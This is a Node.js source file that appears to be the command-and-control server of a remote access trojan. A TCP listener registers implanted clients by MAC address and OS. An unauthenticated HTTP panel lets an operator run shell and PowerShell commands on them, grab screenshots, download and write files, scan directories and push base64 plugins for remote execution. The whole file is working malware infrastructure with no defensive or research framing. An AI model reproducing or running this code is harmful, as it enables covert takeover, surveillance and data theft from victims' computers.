const net = require('net');
const http = require('http');
const url = require('url');
const fs = require("fs");
const mime = require("mime-types");
const qs = require('querystring');

class Plugin {
    constructor(name, base64) {
        this.name = name;
        this.base64 = base64;
    }
}

const plugins = {
    FILENAME: "pluginSaves.json",
    _plugins: {},
    updateFile() {
        fs.writeFile(this.FILENAME, JSON.stringify(this.getAllPlugins()), err => {
            if (err) console.log(err);
        });
    },
    getAllPlugins() {
        let result = {};
        for (let plugin in this._plugins) {
            if (this._plugins.hasOwnProperty(plugin) && this._plugins[plugin] !== undefined) {
                result[plugin] = this._plugins[plugin];
            }
        }
        return result;
    },
    addPlugin(name, base64) {
        if (this._plugins[name] === undefined) {
            this._plugins[name] = new Plugin(name, base64);
        }
        this.updateFile();
    },
    deletePlugin(name) {
        if (this._plugins[name] !== undefined) {
            this._plugins[name] = undefined;
        }
        this.updateFile();
    },
    restorePlugins() {
        fs.readFile(this.FILENAME, (err, data) => {
            if (err) console.log(err); else {
                this._plugins = JSON.safeParse(data);
                if (!this._plugins) this._plugins = {};
            }
        })
    },
    getPlugin(name) {
        return this._plugins[name];
    }
};

plugins.restorePlugins();

class Client {
    constructor(socket, os, doRequest) {
        this.ip = socket.remoteAddress;
        this.port = socket.remotePort;
        this.os = os;
        this.doRequest = doRequest;
        this.onCompletedArray = [];
        this.currentID = 0;
    }

    onRequestCompleted(result) {
        for (let i = 0; i < this.onCompletedArray.length; i++) {
            if (this.onCompletedArray[i](result)) {
                this.onCompletedArray.splice(i, 1);
            }
        }
    }

    request(type, data, onComplete, onError) {
        let id = this.currentID++;
        this.onCompletedArray.push(function (result) {
            if (result['id'] == id) {
                if (result['success']) {
                    onComplete(result);
                } else {
                    if (typeof onError === "function") {
                        onError(new Error(result['error']))
                    } else {
                        throw new Error(result['error'])
                    }
                }
                return true;
            }
            return false;
        });
        data['type'] = type;
        data['id'] = id;
        this.doRequest(data);
    }

    setCommand(command, onComplete, isPSL = false, onError) {
        isPSL = !!isPSL;
        this.request(isPSL ? "psl" : "command", {
            command: command
        }, onComplete, onError);
    }

    takeScreenshot(onComplete, onError) {
        this.request("screenshot", {}, onComplete, onError);
    }

    getFile(path, onComplete, onError) {
        this.request("get_file", {
            "path": path
        }, onComplete, onError);
    }

    writeFile(path, base64, onComplete, onError) {
        this.request("write_file", {
            path: path,
            base64: base64
        }, onComplete, onError);
    }

    scan(dir, onComplete, onError) {
        this.request("scan", {
            dir: dir
        }, onComplete, onError);
    }

    executePlugin(pluginName, parameters, onComplete, onError) {
        this.request("plugin", {
            base64: plugins.getPlugin(pluginName).base64,
            name: plugins.getPlugin(pluginName).name,
            parameters: parameters
        }, onComplete, onError)
    }

    heartbeat(onComplete, onError) {
        this.request("heartbeat", {}, onComplete, onError)
    }
}

JSON.safeParse = function (str) {
    try {
        return this.parse(str);
    } catch (e) {
        return false;
    }
};

const clients = {};

const Labels = {
    FILENAME: "labels.json",
    _labels: {},
    getLabels: function () {
        let result = {};
        for (let key in this._labels) {
            if (this._labels.hasOwnProperty(key) && this._labels[key] !== undefined) {
                result[key] = this._labels[key];
            }
        }
        return result;
    },
    addLabel: function (name, value) {
        this._labels[name] = value;
        this.saveLabels();
    },
    getLabel: function (name) {
        return this._labels[name];
    },
    saveLabels() {
        fs.writeFile(this.FILENAME, JSON.stringify(this.getLabels()), () => {});
    },
    loadLabels() {
        fs.readFile(this.FILENAME, (err, data) => {
            if (err) console.log(err); else {
                this._labels = JSON.safeParse(data) || {};
            }
        })
    }
};

Labels.loadLabels();

const socketServer = net.createServer(socket => {
    let mac, client, os, fullData = "", timerID = undefined;
    socket.on('data', chunk => {
        if (chunk.toString().charAt(chunk.toString().length - 1) === "}") {
            fullData += chunk.toString();
            let obj = JSON.safeParse(fullData);
            fullData = "";
            if (obj) {
                if (obj['type'] === 'init') {
                    mac = obj['mac'];
                    os = obj['os'];
                    client = clients[mac] = new Client(socket, os, (data) => {
                        socket.write(JSON.stringify(data) + "\n");
                    });
                    timerID = setInterval(() => {
                        client.heartbeat(() => {}, () => {})
                    }, 10000);
                    console.log("Client " + mac + " connected!\nOS: " + os + "\nIP address: " + client.ip + ":" + client.port + "\n");
                } else if (obj['type'] === "result") {
                    client.onRequestCompleted(obj);
                }
            }
        } else fullData += chunk.toString();
    });

    socket.on('end', onEnd);
    socket.on('error', onEnd);

    function onEnd(e) {
        if (e) console.log(e);
        if (clients[mac] !== undefined) {
            clients[mac] = undefined;
            console.log("Client " + mac + " disconnected!");
        }
        if (timerID !== undefined) clearInterval(timerID);
    }
});

socketServer.listen(8080);

const httpServer = http.createServer((req, res) => {
    if (req.method === "GET") {
        processQuery(url.parse(req.url, true).query);
    } else if (req.method === "POST") {
        let body = '';

        req.on('data', function (data) {
            body += data;
        });

        req.on('end', function () {
            let post = qs.parse(body);
            processQuery(post)
        });
    }

    function processQuery(query) {

        function handleError(err) {
            res.writeHead(403, {'Content-Type': 'text/html'});
            res.end("Error: " + err.toString());
        }

        if (query != null) {
            if (typeof query['mac'] !== "undefined") {
                if (clients[query['mac']] !== undefined) {
                    if (typeof query['command'] !== "undefined") {
                        clients[query['mac']].setCommand(query['command'], result => {
                            res.writeHead(200, {'Content-Type': 'text/plain'});
                            res.end(result['result']);
                        }, false, handleError);
                    } else if (typeof query['psl'] !== "undefined") {
                        clients[query['mac']].setCommand(query['psl'], result => {
                            res.writeHead(200, {'Content-Type': 'text/plain'});
                            res.end(result['result']);
                        }, true, handleError);
                    } else if (typeof query['screenshot'] !== "undefined") {
                        clients[query['mac']].takeScreenshot(result => {
                            res.writeHead(200, {'Content-Type': 'image/png'});
                            res.end(Buffer.from(result['base64'], 'base64'));
                        }, handleError);
                    } else if (typeof query['path'] !== "undefined") {
                        if (typeof query['base64'] === "undefined") {
                            clients[query['mac']].getFile(query["path"], result => {
                                let decoded = Buffer.from(result['base64'], 'base64');
                                res.writeHead(200, {
                                    'Content-Type': mime.lookup(query['path']) || 'application/octet-stream',
                                    'Content-Disposition': `attachment; filename=${(() => {
                                        let arr = query['path'].split(/[\\/]/);
                                        return arr[arr.length - 1];
                                    })()}`
                                });
                                //res.writeHead(200, {'Content-Type': 'text/plain'});
                                /*fs.writeFile((() => {
                                    let arr = query['path'].split(/[\\/]/);
                                    return arr[arr.length - 1];
                                })(), decoded, () => {});*/
                                res.end(decoded);
                                //res.end(result['base64']);
                            }, handleError);
                        } else {
                            clients[query['mac']].writeFile(query['path'], query['base64'], result => {
                                res.end("");
                            }, handleError);
                        }
                    } else if (typeof query['scan'] !== "undefined") {
                        clients[query['mac']].scan(query['scan'], result => {
                            res.writeHead(200, {'Content-Type': 'application/json'});
                            res.end(JSON.stringify(result));
                        }, handleError);
                    } else if (typeof query['plugin_name'] !== "undefined" && typeof query['parameters'] !== "undefined") {
                        if (typeof plugins.getPlugin(query['plugin_name']) !== "undefined" && JSON.safeParse(query["parameters"])) {
                            clients[query["mac"]].executePlugin(query['plugin_name'], JSON.safeParse(query["parameters"]), result => {
                                res.end(result['result']);
                            }, handleError);
                        }
                    } else if (typeof query["label"] !== "undefined") {
                        Labels.addLabel(query["mac"], query["label"]);
                        res.writeHead(204, {});
                        res.end("");
                    } else {
                        res.writeHead(403, {'Content-Type': 'text/html'});
                        res.end("Unknown operation");
                    }
                } else {
                    res.writeHead(403, {'Content-Type': 'text/html'});
                    res.end('Such mac is not connected');
                }
            } else if (typeof query['clients'] !== "undefined") {
                res.writeHead(200, {'Content-Type': 'text/plain'});
                let obj = [];
                for (let mac in clients) {
                    if (clients.hasOwnProperty(mac) && typeof clients[mac] !== "undefined") {
                        obj.push({
                            mac: mac,
                            ip: clients[mac].ip,
                            port: clients[mac].port,
                            os: clients[mac].os,
                            label: Labels.getLabel(mac) || "kar"
                        });
                    }
                }
                res.end(JSON.stringify(obj));
            } else if (typeof query['control'] !== "undefined") {
                res.writeHead(200, {'Content-Type': 'text/html'});
                fs.readFile("index.html", "utf8", (err, data) => {
                    if (err) {
                        res.end(err.toString());
                    } else {
                        res.end(data.toString());
                    }
                });
            } else if (typeof query['plugin_control'] !== "undefined") {
                res.writeHead(200, {'Content-Type': 'text/html'});
                fs.readFile("plugins.html", "utf8", (err, data) => {
                    if (err) {
                        res.end(err.toString());
                    } else {
                        res.end(data.toString());
                    }
                });
            } else if (typeof query['plugins'] !== "undefined") {
                let response = [];
                let allPlugins = plugins.getAllPlugins();
                for (let name in allPlugins) {
                    if (allPlugins.hasOwnProperty(name) && allPlugins[name] !== undefined) {
                        let plugin = allPlugins[name];
                        response.push({
                            name: plugin.name
                        })
                    }
                }
                res.writeHead(200, {'Content-Type': 'text/plain'});
                res.end(JSON.stringify(response));
            } else if (typeof query["plugin_name"] !== "undefined") {
                if (typeof query["base64"] !== "undefined") {
                    if (typeof plugins.getPlugin(query["plugin_name"]) === "undefined") {
                        plugins.addPlugin(query["plugin_name"], query["base64"]);
                        res.end("")
                    }
                } else {
                    let nameToDelete = query["plugin_name"];
                    plugins.deletePlugin(nameToDelete);
                    res.end("");
                }
            } else {
                res.end("fuck you");
            }
        } else {
            res.end("wtf");
        }
    }
});

httpServer.listen(6702);